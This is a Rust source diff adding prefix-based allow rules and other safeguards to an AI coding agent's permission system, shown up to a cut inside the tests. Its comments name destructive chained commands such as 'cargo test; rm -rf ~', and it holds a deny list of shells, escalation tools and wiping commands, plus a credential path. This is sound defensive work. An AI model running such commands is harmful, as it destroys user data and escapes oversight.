@@ -13,6 +13,18 @@
 //! - **Argument rule**: `tool(field:pattern)` where `field` is a named JSON
 //!   input field and `pattern` uses glob matching (`*` / `**` match arbitrary
 //!   text, everything else is literal).  Example: `bash(command:cargo test *)`.
+//! - **Command-prefix rule**: `tool(field:^words)`, an argument rule whose
+//!   pattern opens with `^`. It matches only when *every* shell command in the
+//!   field begins with those words. See [`PermissionRule::CommandPrefix`].
+//! - **Path-prefix rule**: `tool(field:@components)`, whose pattern opens with
+//!   `@`. It matches when the field's path lies under that folder. See
+//!   [`PermissionRule::PathPrefix`].
+//!
+//! Both prefix forms are what the popup's "always allow this pattern" choice
+//! records, and both are token-based: their tokens are compared, never
+//! glob-matched, so a token may contain any character — including the `)` that
+//! ends the rule. That last property is why the prefix forms can express rules
+//! the glob form must refuse (see [`PermissionRule::generate`]).
 //!
 //! # Precedence
 //!
@@ -71,6 +83,39 @@ pub enum PermissionRule {
         /// Compiled glob matcher.  `None` if the pattern is invalid.
         matcher: Option<GlobMatcher>,
     },
+    /// Command-prefix rule — the argument field must be an enumerable shell
+    /// command whose every segment begins with `tokens`.
+    /// Example: `bash(command:^cargo test)`
+    ///
+    /// Deliberately *not* glob-matched. A glob `*` spans `;`, so
+    /// `bash(command:cargo test *)` also matches `cargo test; rm -rf ~` — and,
+    /// because a rule matches the whole string while `deny` rules do too, it
+    /// would authorise that second command while the `deny` rule naming it
+    /// (whose pattern starts with `rm`, not `cargo`) never got a look in.
+    /// Segmenting the command and requiring every segment to be covered is what
+    /// makes this width expressible without that hole.
+    CommandPrefix {
+        /// Canonical stable tool name.
+        tool: String,
+        /// JSON input field holding the command.
+        field: String,
+        /// Leading words every command segment must begin with.
+        tokens: Vec<String>,
+    },
+    /// Path-prefix rule — the argument field must be a workspace-relative path
+    /// lying under `components`.
+    /// Example: `edit_file(path:@docs)`
+    ///
+    /// Component-wise, not string-wise: `@src` covers `src/lib.rs` and not
+    /// `srcx/lib.rs`, which a string prefix would have got wrong.
+    PathPrefix {
+        /// Canonical stable tool name.
+        tool: String,
+        /// JSON input field holding the path.
+        field: String,
+        /// Folder components the path must begin with.
+        components: Vec<String>,
+    },
 }
 
 impl PermissionRule {
@@ -85,7 +130,8 @@ impl PermissionRule {
     /// rule        = tool | tool "(" field ":" pattern ")"
     /// tool        = non-empty text excluding '(' and ')'
     /// field       = non-empty text excluding ':' and ')'
-    /// pattern     = non-empty text excluding ')'
+    /// pattern     = non-empty text excluding ')' | "^" prefix-words
+    /// prefix-words = one or more whitespace-separated words
     /// ```
     pub fn parse(s: &str) -> Option<Self> {
         let s = s.trim();
@@ -116,16 +162,49 @@ impl PermissionRule {
                 }
 
                 let inner = &s[open + 1..close];
-                // The grammar forbids ')' inside the argument body.
-                if inner.contains(')') {
-                    return None;
-                }
 
                 if let Some(colon) = inner.find(':') {
                     let field = inner[..colon].trim().to_string();
                     let pattern = inner[colon + 1..].trim().to_string();
 
                     if field.is_empty() || pattern.is_empty() {
+                        return None;
+                    }
+
+                    // The two prefix forms are read *before* the delimiter check
+                    // below, and that order is the whole point: their tokens are
+                    // compared rather than glob-matched, and the rule ends at
+                    // the final `)`, which `rfind` above already located. So a
+                    // token containing a `)` or a `(` round-trips here where the
+                    // glob form cannot hold one at all.
+                    if let Some(words) = pattern.strip_prefix('^') {
+                        let tokens: Vec<String> =
+                            words.split_whitespace().map(str::to_string).collect();
+                        if tokens.is_empty() {
+                            return None;
+                        }
+                        return Some(PermissionRule::CommandPrefix {
+                            tool,
+                            field,
+                            tokens,
+                        });
+                    }
+                    if let Some(folder) = pattern.strip_prefix('@') {
+                        let components = path_components(folder);
+                        if components.is_empty() {
+                            return None;
+                        }
+                        return Some(PermissionRule::PathPrefix {
+                            tool,
+                            field,
+                            components,
+                        });
+                    }
+
+                    // The glob form keeps the restriction: a pattern containing
+                    // `)` cannot be told apart from the rule's terminator by eye
+                    // when it is read back out of the settings file.
+                    if inner.contains(')') {
                         return None;
                     }
 
@@ -185,13 +264,60 @@ impl PermissionRule {
                     _ => false,
                 }
             }
+            PermissionRule::CommandPrefix {
+                tool,
+                field,
+                tokens,
+            } => {
+                if tool != tool_name {
+                    return false;
+                }
+                let Some(Value::String(command)) = input.get(field) else {
+                    return false;
+                };
+                // A command whose segments cannot be enumerated cannot be
+                // covered by a prefix — ask, rather than assume.
+                let Some(segments) = crate::shell::command_segments(command) else {
+                    return false;
+                };
+                // Every segment, or none: a rule that covered only the first
+                // would authorise the rest without the user ever seeing it.
+                !segments.is_empty()
+                    && segments
+                        .iter()
+                        .all(|segment| segment_starts_with(segment, tokens))
+            }
+            PermissionRule::PathPrefix {
+                tool,
+                field,
+                components,
+            } => {
+                if tool != tool_name {
+                    return false;
+                }
+                let Some(Value::String(path)) = input.get(field) else {
+                    return false;
+                };
+                // Component-wise, so `@src` covers `src/lib.rs` and not
+                // `srcx/lib.rs`. A `..` component simply fails to match the
+                // stored prefix, which is the closed direction.
+                let actual = path_components(path);
+                actual.len() >= components.len()
+                    && actual
+                        .iter()
+                        .zip(components)
+                        .all(|(component, expected)| component == expected)
+            }
         }
     }
 
     /// Return the tool name this rule governs.
     pub fn tool_name(&self) -> &str {
         match self {
-            PermissionRule::Bare { tool } | PermissionRule::Argument { tool, .. } => tool,
+            PermissionRule::Bare { tool }
+            | PermissionRule::Argument { tool, .. }
+            | PermissionRule::CommandPrefix { tool, .. }
+            | PermissionRule::PathPrefix { tool, .. } => tool,
         }
     }
 
@@ -205,61 +331,325 @@ impl PermissionRule {
                 pattern,
                 ..
             } => format!("{}({}:{})", tool, field, pattern),
+            PermissionRule::CommandPrefix {
+                tool,
+                field,
+                tokens,
+            } => format!("{}({}:^{})", tool, field, tokens.join(" ")),
+            PermissionRule::PathPrefix {
+                tool,
+                field,
+                components,
+            } => format!("{}({}:@{})", tool, field, components.join("/")),
         }
     }
 
     /// Generate a permission rule from a tool metadata policy and current input.
     ///
-    /// - `Command { field }`: produces `tool(field:<command>)` if representable;
-    ///   falls back to bare rule if the value contains `)` or `:` in a way that
-    ///   makes the rule ambiguous.
-    /// - `Path { field }`: same as Command.
-    /// - `Question { field }`: same as Command.
-    /// - `Json`: bare tool rule (no field available generically).
+    /// Returns `None` when no rule that is **narrower than the whole tool** can
+    /// be expressed from this input, in which case the caller must record
+    /// nothing:
     ///
-    /// The generated pattern uses the current value as an exact glob (no
-    /// wildcard insertion) unless the value already contains `*` or `**`.
-    /// Values containing `(` or `)` cause a fallback to bare rule to avoid
-    /// ambiguous parsing.
-    pub fn generate(tool_name: &str, policy: PermissionPromptPolicy, input: &Value) -> Self {
-        match policy {
-            PermissionPromptPolicy::Command { field }
-            | PermissionPromptPolicy::Path { field }
-            | PermissionPromptPolicy::Question { field } => {
-                // Try to get the string value from the named field.
-                if let Some(Value::String(val)) = input.get(field) {
-                    // Check that the value doesn't contain delimiters that
-                    // would make argument-rule parsing ambiguous.
-                    if val.contains('(') || val.contains(')') || val.contains(':') {
-                        // Fall back to bare rule.
-                        return PermissionRule::Bare {
-                            tool: tool_name.to_string(),
-                        };
-                    }
-                    // Use the value as an exact glob pattern (no wildcard
-                    // insertion unless already present).
-                    let pattern = val.clone();
-                    // Compile immediately so the returned rule can be
-                    // matched without round-tripping through parse().
-                    let matcher = Glob::new(&pattern).ok().map(|g| g.compile_matcher());
-                    PermissionRule::Argument {
-                        tool: tool_name.to_string(),
-                        field: field.to_string(),
-                        pattern,
-                        matcher,
-                    }
-                } else {
-                    // Field not present or not a string — bare rule.
-                    PermissionRule::Bare {
-                        tool: tool_name.to_string(),
-                    }
-                }
-            }
-            PermissionPromptPolicy::Json => PermissionRule::Bare {
+    /// - `Json`: the prompt was tool-wide, so a bare rule is exactly what the
+    ///   user answered — `Some(Bare)`.
+    /// - `Command` / `Path` / `Question` / `PatchTarget`: the prompt named a
+    ///   specific argument, so the rule has to name it too. If the field is
+    ///   absent, is not a string, or its value contains a rule-grammar
+    ///   delimiter (`(`, `)`, `:` — the pattern is embedded in
+    ///   `tool(field:pattern)`), there is no way to say "this argument and not
+    ///   the others", and falling back to a bare rule would grant **more** than
+    ///   the user was asked about.
+    ///
+    /// That last case is not hypothetical: `bash` on any command containing a
+    /// colon (`git commit -m "fix: thing"`) used to generate a bare `bash`
+    /// rule, so one click on "Always allow this tool" permitted every future
+    /// shell command in every session.
+    #[must_use]
+    pub fn generate(
+        tool_name: &str,
+        policy: PermissionPromptPolicy,
+        input: &Value,
+    ) -> Option<Self> {
+        if matches!(policy, PermissionPromptPolicy::Json) {
+            return Some(PermissionRule::Bare {
                 tool: tool_name.to_string(),
-            },
+            });
+        }
+
+        let (field, value) = policy.generate_key(input)?;
+        if value.contains('(') || value.contains(')') || value.contains(':') {
+            tracing::warn!(
+                "Not remembering a permission rule for {tool_name}: its {field} value contains a \
+                 rule-grammar delimiter, and a tool-wide rule would be broader than the prompt \
+                 the user answered."
+            );
+            return None;
+        }
+
+        // Use the value as an exact glob pattern (no wildcard insertion unless
+        // already present). Compiled immediately so the returned rule can be
+        // matched without round-tripping through `parse()`.
+        let matcher = Glob::new(&value).ok().map(|g| g.compile_matcher());
+        Some(PermissionRule::Argument {
+            tool: tool_name.to_string(),
+            field: field.to_string(),
+            pattern: value,
+            matcher,
+        })
+    }
+
+    /// Build the prefix rule behind the popup's "always allow this pattern"
+    /// choice, dispatching on what kind of value the prompt is about.
+    ///
+    /// One entry point, because the popup offers one choice: whether a rule can
+    /// be built for *this call* is a single question, and the option's presence
+    /// and the rule it previews both come from it. A `Path` prompt yields a
+    /// folder rule, a `Command` prompt a program rule, and anything else
+    /// (`Json`, `PatchTarget`, `Question`) yields nothing.
+    #[must_use]
+    pub fn generate_prefix(
+        tool_name: &str,
+        policy: PermissionPromptPolicy,
+        input: &Value,
+    ) -> Option<Self> {
+        match policy {
+            PermissionPromptPolicy::Command { field } => {
+                Self::generate_command_prefix(tool_name, field, input)
+            }
+            PermissionPromptPolicy::Path { field } => {
+                Self::generate_path_prefix(tool_name, field, input)
+            }
+            PermissionPromptPolicy::Json
+            | PermissionPromptPolicy::Question { .. }
+            | PermissionPromptPolicy::PatchTarget { .. } => None,
         }
     }
+
+    /// The "this program, with this subcommand" rule.
+    ///
+    /// Broader than [`Self::generate`] by design — that is what the option is
+    /// for — and therefore fenced on every side that can be fenced:
+    ///
+    /// - **Only one enumerable segment.** A compound command
+    ///   (`cargo test && rm -rf ~`) has no prefix that describes what it does,
+    ///   and a command the shell can pull another command out of — a
+    ///   substitution — is refused outright
+    ///   (see [`crate::shell::command_segments`]).
+    /// - **At least two words, and the second is not a flag.** One word would
+    ///   make `^cargo` or `^git` "run anything this program can run", which is
+    ///   the width the option exists to avoid; a flag in second position makes
+    ///   the prefix name an option rather than a capability (`^git -c`, and
+    ///   `-c` is how a pager becomes a shell). The program must be a bare name
+    ///   — no `/`, no `=` — so `./deploy.sh` and `FOO=1 cargo` are not
+    ///   prefix-shaped.
+    /// - **[`UNSAFE_PREFIX_PROGRAMS`].** Programs whose purpose is to run other
+    ///   code, or to reach another shell or user, never get a prefix: a rule
+    ///   for `sh`, `python`, `find`, `sed`, `env`, `xargs` or `sudo` would be a
+    ///   tool-wide allow wearing a narrower costume.
+    ///
+    /// What is *not* fenced, and cannot be: a prefix for a build tool
+    /// (`cargo test`, `npm run build`) trusts that project's own build
+    /// configuration, because a `build.rs` and an npm `postinstall` run
+    /// arbitrary code. That is the trade the option exists to offer, which is
+    /// why the popup shows the rule it is about to record rather than recording
+    /// one silently.
+    fn generate_command_prefix(
+        tool_name: &str,
+        field: &'static str,
+        input: &Value,
+    ) -> Option<Self> {
+        let command = input.get(field)?.as_str()?;
+
+        // Exactly one segment, and one the shell cannot run a second command
+        // out of.
+        let segments = crate::shell::command_segments(command)?;
+        let [segment] = segments.as_slice() else {
+            return None;
+        };
+
+        let words: Vec<String> = segment.split_whitespace().map(str::to_string).collect();
+        if words.len() < PREFIX_TOKENS {
+            return None;
+        }
+        let program = words[0].as_str();
+        let bare_name = program
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+'))
+            && !program.contains('=')
+            && !program.is_empty();
+        if !bare_name || UNSAFE_PREFIX_PROGRAMS.contains(&program) {
+            return None;
+        }
+        if words[1].starts_with('-') {
+            return None;
+        }
+
+        Some(PermissionRule::CommandPrefix {
+            tool: tool_name.to_string(),
+            field: field.to_string(),
+            tokens: words[..PREFIX_TOKENS].to_vec(),
+        })
+    }
+
+    /// The "this folder" rule, for the file tools.
+    ///
+    /// A folder is a much smaller ask than a program: nothing here can be
+    /// talked into running other code, so the fences are about *scope*:
+    ///
+    /// - **Workspace-relative only.** An absolute path, or one starting `~`, or
+    ///   one containing `..`, is the sensitive-target guard's territory — a rule
+    ///   that pre-approved one would route around the guard's own prompt.
+    /// - **At least two components.** A single component is a file at the
+    ///   workspace root, and the exact rule ("always allow this tool") already
+    ///   covers exactly that file. What is left is a folder, which is the
+    ///   complement the exact rule cannot express.
+    /// - **Not a dot-directory.** `.git` holds hooks that run on the next git
+    ///   command, so a persisted rule for it would be an arbitrary-execution
+    ///   grant wearing a path's clothes. `.tact` holds the settings file these
+    ///   rules are written to.
+    fn generate_path_prefix(tool_name: &str, field: &'static str, input: &Value) -> Option<Self> {
+        let raw = input.get(field)?.as_str()?.trim();
+        if raw.starts_with('~') || raw.starts_with('/') {
+            return None;
+        }
+        let components = path_components(raw);
+        if components.len() < 2 {
+            return None;
+        }
+        let folder = &components[..components.len() - 1];
+        if folder.iter().any(|component| component == "..") || folder[0].starts_with('.') {
+            return None;
+        }
+
+        Some(PermissionRule::PathPrefix {
+            tool: tool_name.to_string(),
+            field: field.to_string(),
+            components: folder.to_vec(),
+        })
+    }
+}
+
+/// How many leading words the "always allow this program" rule covers.
+///
+/// Two, not one: a single word is a whole-program allow — `^cargo`, `^git` —
+/// which is exactly the width the option exists to avoid.
+const PREFIX_TOKENS: usize = 2;
+
+/// Programs a prefix rule is never generated for.
+///
+/// Two families, for two different reasons:
+///
+/// - **Runners.** A shell, an interpreter, or a wrapper whose purpose is to run
+///   whatever its arguments name (`sh`, `python`, `env`, `xargs`, `find
+///   -exec`, `sed -e …/e`, `awk system()`). A prefix for one of those is a
+///   tool-wide allow wearing a narrower costume.
+/// - **Irreversible.** Commands where remembering a prefix is a footgun the
+///   user cannot scope — `^rm -rf` names no path. This mirrors the reference
+///   CLI-approval flow's "never propose a prefix rule for `rm`".
+///
+/// Not exhaustive, and not intended to be: a program with an "execute this"
+/// flag (`tar --to-command`, `rsync -e`) is a moving target. The list holds the
+/// ones where the flag is the *point* of the program, and the sensitive-target
+/// guard remains the backstop for everything else.
+const UNSAFE_PREFIX_PROGRAMS: &[&str] = &[
+    // Shells.
+    "sh",
+    "bash",
+    "zsh",
+    "fish",
+    "dash",
+    "ksh",
+    "csh",
+    "tcsh",
+    "ash",
+    "busybox",
+    // Interpreters and runtimes that take code in their arguments.
+    "python",
+    "python2",
+    "python3",
+    "node",
+    "nodejs",
+    "deno",
+    "bun",
+    "ruby",
+    "perl",
+    "php",
+    "lua",
+    "luajit",
+    "rscript",
+    "julia",
+    "swift",
+    "osascript",
+    "pwsh",
+    "powershell",
+    // Wrappers whose argument list is the real command.
+    "env",
+    "xargs",
+    "nohup",
+    "setsid",
+    "time",
+    "timeout",
+    "nice",
+    "stdbuf",
+    "command",
+    "builtin",
+    "eval",
+    "exec",
+    "source",
+    ".",
+    // Escalation and indirection into another context.
+    "sudo",
+    "su",
+    "doas",
+    "ssh",
+    "nsenter",
+    "docker",
+    "podman",
+    "kubectl",
+    "systemd-run",
+    "tar",
+    "rsync",
+    // Programs that execute through a flag.
+    "find",
+    "sed",
+    "awk",
+    "gawk",
+    "mawk",
+    // Irreversible.
+    "rm",
+    "rmdir",
+    "shred",
+    "dd",
+    "mkfs",
+    "mkswap",
+    "truncate",
+    "chmod",
+    "chown",
+    "chgrp",
+];
+
+/// Split a path into its components, dropping a leading `./`.
+///
+/// Used by both the generator and the matcher, so the rule a user approves and
+/// the paths it covers are read the same way. Dropping `./` widens nothing: it
+/// is the same location spelled differently.
+fn path_components(value: &str) -> Vec<String> {
+    let value = value.trim();
+    let value = value.strip_prefix("./").unwrap_or(value);
+    value
+        .split('/')
+        .filter(|component| !component.is_empty())
+        .map(str::to_string)
+        .collect()
+}
+
+/// Whether `segment`'s own words begin with `tokens`.
+///
+/// Word-wise, not string-wise, so `^cargo test` covers `cargo test --lib` and
+/// does not cover `cargo testing`.
+fn segment_starts_with(segment: &str, tokens: &[String]) -> bool {
+    let words: Vec<&str> = segment.split_whitespace().collect();
+    words.len() >= tokens.len() && words.iter().zip(tokens).all(|(word, token)| word == token)
 }
 
 /// A collection of parsed rules grouped by action, with precedence-aware
@@ -321,8 +711,21 @@ impl EffectiveRules {
     }
 }
 
-/// The known permission sections stored in a JSON settings file.
+/// One settings file, parsed.
 ///
+/// A layer is what `load_from` merges: the project file wins where it speaks,
+/// the global file fills the rest.
+#[derive(Debug, Clone, Default)]
+struct Layer {
+    /// `None` when the file was missing or malformed.
+    doc: Option<Value>,
+    allow: Vec<String>,
+    ask: Vec<String>,
+    deny: Vec<String>,
+    security: crate::security::SecurityConfig,
+}
+
+/// The known permission sections stored in a JSON settings file.///
 /// The expected JSON shape is:
 /// ```json
 /// {
@@ -352,6 +755,9 @@ pub struct PermissionSettings {
     /// Effective deny rules (project + global merged).
     deny_rules: Vec<String>,
 
+    /// Effective sensitive-path/redaction config (project + global merged).
+    security: crate::security::SecurityConfig,
+
     /// Cached parsed effective rules, rebuilt whenever raw rule lists change.
     /// Avoids re-parsing every raw rule on every `PermissionManager::check` call.
     cached_effective: EffectiveRules,
@@ -374,26 +780,24 @@ impl PermissionSettings {
     /// This constructor is designed for tests that want to supply a
     /// specific global path without mutating the process-wide `$HOME`.
     pub fn load_from(project_path: &Path, global_path: Option<&Path>) -> Self {
-        let (project_doc, project_allow, project_ask, project_deny) =
-            Self::load_file(Some(project_path));
+        let project = Self::load_layer(Some(project_path));
+        let global = Self::load_layer(global_path);
 
-        let (_global_doc, global_allow, global_ask, global_deny) = Self::load_file(global_path);
+        let mut allow_rules = global.allow;
+        let mut ask_rules = global.ask;
+        let mut deny_rules = global.deny;
 
-        let mut allow_rules = global_allow;
-        let mut ask_rules = global_ask;
-        let mut deny_rules = global_deny;
-
-        for r in project_allow {
+        for r in project.allow {
             if !allow_rules.contains(&r) {
                 allow_rules.push(r);
             }
         }
-        for r in project_ask {
+        for r in project.ask {
             if !ask_rules.contains(&r) {
                 ask_rules.push(r);
             }
         }
-        for r in project_deny {
+        for r in project.deny {
             if !deny_rules.contains(&r) {
                 deny_rules.push(r);
             }
@@ -403,7 +807,7 @@ impl PermissionSettings {
         // A missing/malformed project file does NOT copy the global raw
         // document, so that a subsequent persist writes a fresh project
         // file rather than inheriting global-only fields/rules.
-        let project_doc = project_doc.unwrap_or(Value::Object(Map::new()));
+        let project_doc = project.doc.unwrap_or(Value::Object(Map::new()));
 
         // Build cached effective rules before moving the rule vectors.
         let cached = EffectiveRules::from_lists(&allow_rules, &ask_rules, &deny_rules);
@@ -414,6 +818,7 @@ impl PermissionSettings {
             allow_rules,
             ask_rules,
             deny_rules,
+            security: crate::security::SecurityConfig::merge(&global.security, &project.security),
             cached_effective: cached,
         }
     }
@@ -428,21 +833,25 @@ impl PermissionSettings {
     ///
     /// Returns `(doc, allow, ask, deny)` where `doc` is `None` when the file
     /// could not be read or parsed.
-    fn load_file(path: Option<&Path>) -> (Option<Value>, Vec<String>, Vec<String>, Vec<String>) {
+    /// Read a single settings file and extract everything this store uses.
+    ///
+    /// Every field is empty when the file is missing or malformed, which is how
+    /// the caller is told to treat the layer as absent.
+    fn load_layer(path: Option<&Path>) -> Layer {
         let path = match path {
             Some(p) => p,
-            None => return (None, vec![], vec![], vec![]),
+            None => return Layer::default(),
         };
 
         let content = match std::fs::read_to_string(path) {
             Ok(c) => c,
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                 // Missing file is normal — no rules.
-                return (None, vec![], vec![], vec![]);
+                return Layer::default();
             }
             Err(e) => {
                 tracing::warn!("Failed to read settings file {:?}: {}", path, e);
-                return (None, vec![], vec![], vec![]);
+                return Layer::default();
             }
         };
 
@@ -450,14 +859,27 @@ impl PermissionSettings {
             Ok(v) => v,
             Err(e) => {
                 tracing::warn!("Failed to parse settings file {:?}: {}", path, e);
-                return (None, vec![], vec![], vec![]);
+                return Layer::default();
             }
         };
 
         let doc_clone = doc.clone();
         let (allow, ask, deny) = extract_rule_lists(&doc);
 
-        (Some(doc_clone), allow, ask, deny)
+        Layer {
+            doc: Some(doc_clone),
+            allow,
+            ask,
+            deny,
+            security: crate::security::SecurityConfig::from_document(&doc),
+        }
+    }
+
+    /// The effective sensitive-path / redaction configuration (global merged
+    /// with project).
+    #[must_use]
+    pub fn security_config(&self) -> &crate::security::SecurityConfig {
+        &self.security
     }
 
     /// Return the effective allow rules.
@@ -1206,7 +1628,8 @@ mod tests {
             "bash",
             PermissionPromptPolicy::Command { field: "command" },
             &serde_json::json!({"command": "cargo test"}),
-        );
+        )
+        .unwrap();
 
         assert!(matches!(rule, PermissionRule::Argument { .. }));
         assert_eq!(rule.tool_name(), "bash");
@@ -1219,7 +1642,8 @@ mod tests {
             "edit_file",
             PermissionPromptPolicy::Path { field: "path" },
             &serde_json::json!({"path": "src/main.rs"}),
-        );
+        )
+        .unwrap();
 
         assert!(matches!(rule, PermissionRule::Argument { .. }));
         assert_eq!(rule.to_rule_string(), "edit_file(path:src/main.rs)");
@@ -1231,7 +1655,8 @@ mod tests {
             "ask_user",
             PermissionPromptPolicy::Question { field: "question" },
             &serde_json::json!({"question": "What is your name?"}),
-        );
+        )
+        .unwrap();
 
         assert!(matches!(rule, PermissionRule::Argument { .. }));
         assert_eq!(
@@ -1246,65 +1671,52 @@ mod tests {
             "compact",
             PermissionPromptPolicy::Json,
             &serde_json::json!({"some_field": "value"}),
-        );
+        )
+        .unwrap();
 
         assert!(matches!(rule, PermissionRule::Bare { .. }));
         assert_eq!(rule.to_rule_string(), "compact");
     }
 
+    /// A missing or non-string field means no argument-aware rule is
+    /// expressible. The old behaviour — a bare, tool-wide rule — granted more
+    /// than the prompt the user answered, so it is now `None`.
     #[test]
-    fn generate_command_falls_back_to_bare_when_field_missing() {
-        let rule = PermissionRule::generate(
-            "bash",
-            PermissionPromptPolicy::Command { field: "command" },
-            &serde_json::json!({"not_command": "value"}),
-        );
-
-        assert!(matches!(rule, PermissionRule::Bare { .. }));
-        assert_eq!(rule.tool_name(), "bash");
-    }
-
-    #[test]
-    fn generate_command_falls_back_to_bare_when_field_not_string() {
-        let rule = PermissionRule::generate(
-            "bash",
-            PermissionPromptPolicy::Command { field: "command" },
-            &serde_json::json!({"command": 42}),
-        );
-
-        assert!(matches!(rule, PermissionRule::Bare { .. }));
-    }
-
-    #[test]
-    fn generate_falls_back_to_bare_when_value_contains_delimiter() {
-        // Value containing '(' should trigger fallback to bare rule
-        let rule = PermissionRule::generate(
-            "bash",
-            PermissionPromptPolicy::Command { field: "command" },
-            &serde_json::json!({"command": "echo (hello)"}),
-        );
-
+    fn generate_refuses_when_the_field_is_missing_or_not_a_string() {
         assert!(
-            matches!(rule, PermissionRule::Bare { .. }),
-            "Expected bare rule fallback due to '(' delimiter, got: {:?}",
-            rule
+            PermissionRule::generate(
+                "bash",
+                PermissionPromptPolicy::Command { field: "command" },
+                &serde_json::json!({"not_command": "value"}),
+            )
+            .is_none()
         );
+        assert!(
+            PermissionRule::generate(
+                "bash",
+                PermissionPromptPolicy::Command { field: "command" },
+                &serde_json::json!({"command": 42}),
+            )
+            .is_none()
+        );
+    }
 
-        // Value containing ')' should also trigger fallback
-        let rule2 = PermissionRule::generate(
-            "bash",
-            PermissionPromptPolicy::Command { field: "command" },
-            &serde_json::json!({"command": "echo )"}),
-        );
-        assert!(matches!(rule2, PermissionRule::Bare { .. }));
-
-        // Value containing ':' should trigger fallback
-        let rule3 = PermissionRule::generate(
-            "bash",
-            PermissionPromptPolicy::Command { field: "command" },
-            &serde_json::json!({"command": "echo:hello"}),
-        );
-        assert!(matches!(rule3, PermissionRule::Bare { .. }));
+    /// The regression this whole change exists for: `git commit -m "fix: x"`
+    /// contains a `:`, and used to persist a bare `bash` rule — permission for
+    /// every future shell command.
+    #[test]
+    fn generate_refuses_a_value_containing_a_rule_delimiter() {
+        for command in ["echo (hello)", "echo )", "git commit -m \"fix: thing\""] {
+            let rule = PermissionRule::generate(
+                "bash",
+                PermissionPromptPolicy::Command { field: "command" },
+                &serde_json::json!({ "command": command }),
+            );
+            assert!(
+                rule.is_none(),
+                "a delimiter in {command:?} must not degrade to a tool-wide rule: {rule:?}"
+            );
+        }
     }
 
     #[test]
@@ -1313,7 +1725,8 @@ mod tests {
             "bash",
             PermissionPromptPolicy::Command { field: "command" },
             &serde_json::json!({"command": "cargo test -- --nocapture"}),
-        );
+        )
+        .unwrap();
 
         assert_eq!(
             rule.to_rule_string(),
@@ -1327,9 +1740,58 @@ mod tests {
             "bash",
             PermissionPromptPolicy::Command { field: "command" },
             &serde_json::json!({"command": "cargo test *"}),
-        );
+        )
+        .unwrap();
 
         assert_eq!(rule.to_rule_string(), "bash(command:cargo test *)");
+    }
+
+    /// `apply_patch` used to declare a prompt field its input does not have,
+    /// so "Always allow this tool" persisted a bare `apply_patch` rule: one
+    /// click permitted every future patch, to any file.
+    #[test]
+    fn generate_patch_rule_is_keyed_on_the_single_target() {
+        let rule = PermissionRule::generate(
+            "apply_patch",
+            PermissionPromptPolicy::PatchTarget {
+                patch_field: "patch",
+            },
+            &serde_json::json!({
+                "patch": "--- a/notes.md\n+++ b/notes.md\n@@ -1 +1 @@\n-old\n+new\n"
+            }),
+        )
+        .unwrap();
+
+        assert_eq!(rule.to_rule_string(), "apply_patch(patch:*notes.md*)");
+        assert!(!matches!(rule, PermissionRule::Bare { .. }));
+    }
+
+    /// A multi-file patch keyed on one of its paths would silently authorise
+    /// the others too, so it is not narrowable at all.
+    #[test]
+    fn generate_refuses_a_multi_file_patch() {
+        let rule = PermissionRule::generate(
+            "apply_patch",
+            PermissionPromptPolicy::PatchTarget {
+                patch_field: "patch",
+            },
+            &serde_json::json!({
+                "patch": "+++ b/a.rs\n+++ b/b.rs\n"
+            }),
+        );
+        assert!(rule.is_none());
+    }
+
+    #[test]
+    fn generate_refuses_a_patch_with_no_parseable_target() {
+        let rule = PermissionRule::generate(
+            "apply_patch",
+            PermissionPromptPolicy::PatchTarget {
+                patch_field: "patch",
+            },
+            &serde_json::json!({ "patch": "not a diff" }),
+        );
+        assert!(rule.is_none());
     }
 
     // ——— Round-trip parse + to_string —————————————————
@@ -1354,7 +1816,8 @@ mod tests {
             "bash",
             PermissionPromptPolicy::Command { field: "command" },
             &serde_json::json!({"command": "cargo test"}),
-        );
+        )
+        .unwrap();
         let s = rule.to_rule_string();
 
         // Re-parse and verify it still matches.
@@ -1485,7 +1948,6 @@ mod tests {
             }"#,
         )
         .unwrap();
-
         let mut settings = PermissionSettings::load_from(&project_file, None);
 
         // Add a new rule
@@ -1526,6 +1988,52 @@ mod tests {
             .and_then(|v| v.as_array())
             .unwrap();
         assert_eq!(allow2.len(), 2, "Duplicate rule should not be added again");
+    }
+
+    /// The security sections ride in the same document, so persisting an allow
+    /// rule must not drop them — a "Always allow this tool" click would
+    /// otherwise silently re-enable the guard the user had configured.
+    #[test]
+    fn adding_rule_preserves_the_security_sections() {
+        let dir = tempfile::tempdir().unwrap();
+        let project_file = dir.path().join(".tact/settings.json");
+        std::fs::create_dir_all(dir.path().join(".tact")).unwrap();
+        std::fs::write(
+            &project_file,
+            r#"{
+                "permissions": {
+                    "allow": [],
+                    "sensitive_paths": { "allow": ["~/.netrc"] },
+                    "redaction": { "level": "credential" }
+                }
+            }"#,
+        )
+        .unwrap();
+
+        let mut settings = PermissionSettings::load_from(&project_file, None);
+        assert_eq!(
+            settings.security_config().sensitive_paths.allow,
+            vec!["~/.netrc"]
+        );
+        assert_eq!(
+            settings.security_config().redaction.resolved_level(),
+            crate::security::RedactionLevel::Credential
+        );
+
+        settings.persist_project_allow("read_file(.env)").unwrap();
+
+        let content = std::fs::read_to_string(&project_file).unwrap();
+        let doc: Value = serde_json::from_str(&content).unwrap();
+        assert_eq!(
+            doc.pointer("/permissions/sensitive_paths/allow/0")
+                .and_then(|v| v.as_str()),
+            Some("~/.netrc")
+        );
+        assert_eq!(
+            doc.pointer("/permissions/redaction/level")
+                .and_then(|v| v.as_str()),
+            Some("credential")
+        );
     }
 
     // ——— Persistence creates directory and pretty JSON ———————————
@@ -1848,7 +2356,8 @@ mod tests {
             "bash",
             PermissionPromptPolicy::Command { field: "command" },
             &serde_json::json!({"command": "cargo test --lib"}),
-        );
+        )
+        .unwrap();
 
         // The generated rule should match directly without round-tripping
         assert!(rule.matches("bash", &serde_json::json!({"command": "cargo test --lib"})));
@@ -1863,7 +2372,8 @@ mod tests {
             "bash",
             PermissionPromptPolicy::Command { field: "command" },
             &serde_json::json!({"command": "cargo test *"}),
-        );
+        )
+        .unwrap();
         assert!(wild_rule.matches("bash", &serde_json::json!({"command": "cargo test --lib"})));
         assert!(!wild_rule.matches("bash", &serde_json::json!({"command": "cargo build"})));
     }
@@ -2001,5 +2511,341 @@ mod tests {
                 .action("bash", &serde_json::json!({"command": "rm"}),),
             RuleAction::None
         );
+    }
+}
+
+/// The prefix rule exists so the popup can offer a width between "this one
+/// command" and "this whole tool". Every test here is about the fence around
+/// that width: what it may and may not cover, and what is never proposed.
+#[cfg(test)]
+mod prefix_tests {
+    use super::*;
+
+    fn rule(text: &str) -> PermissionRule {
